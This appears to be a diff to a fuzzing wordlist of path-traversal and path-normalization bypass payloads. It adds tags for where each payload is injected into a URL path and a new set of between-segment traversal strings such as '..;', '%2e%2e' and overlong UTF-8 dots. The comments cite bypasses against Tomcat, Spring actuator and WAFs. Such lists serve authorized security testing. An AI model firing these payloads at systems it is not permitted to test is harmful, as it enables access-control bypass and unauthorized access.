@@ -89,14 +89,16 @@
 ;%2f%2f/../
 
 # ------------------------------------------------------------------------------
-# Query / fragment terminator probes
+# Query / fragment terminator probes — tagged [s] (suffix only) because prefix /
+# sandwich injection of '?' or '#' into mid-path segments just creates malformed
+# query strings, not path-norm tests.
 # ------------------------------------------------------------------------------
-?
-?;
-??
-?#
-#
-#?
+[s]?
+[s]?;
+[s]??
+[s]?#
+[s]#
+[s]#?
 
 # ------------------------------------------------------------------------------
 # Dot-segment normalization
@@ -523,3 +525,39 @@
 
 # Chained: full URL-shape bypass (variations of the quoted WAF-bypass payload)
 %2f%2e%09%2e%5c%2e%09%2e
+
+# ==============================================================================
+# CLASSIFICATION TAG REFERENCE
+#   [p]payload  prefix-only injection   (payload+segment)
+#   [s]payload  suffix-only injection   (segment+payload)
+#   [w]payload  sandwich-wrap injection (payload+segment+payload)
+#   [b]payload  between-segments insert (new standalone segment)
+#   [a]payload  all four of the above
+#   (no tag)    default: p + s + w (not b)
+# Combine: [pb]payload = prefix + between. [sw]payload = suffix + sandwich.
+# ==============================================================================
+
+# ------------------------------------------------------------------------------
+# Between-segments insertion ([b]) — inserts payload as its own path segment
+# between existing segments. Unlocks classic bypasses like /api/..;/v1/users
+# (Tomcat, Spring actuator) that segment-modifying injection cannot produce.
+# Keep these payloads slash-free; '/' separators are added by the join.
+# ------------------------------------------------------------------------------
+[b]..
+[b]..;
+[b]..%00
+[b]..%09
+[b]..%0d
+[b].
+[b]%2e
+[b]%2e%2e
+[b]%2e%2e;
+[b]%2e%2e%00
+[b]..%2f..
+[b]%2e%2e%2f%2e%2e
+[b]..;..
+[b]..;..;
+[b]%c0%ae%c0%ae
+[b]%ef%bc%8e%ef%bc%8e
+[b]..%5c..
+[b]..\..
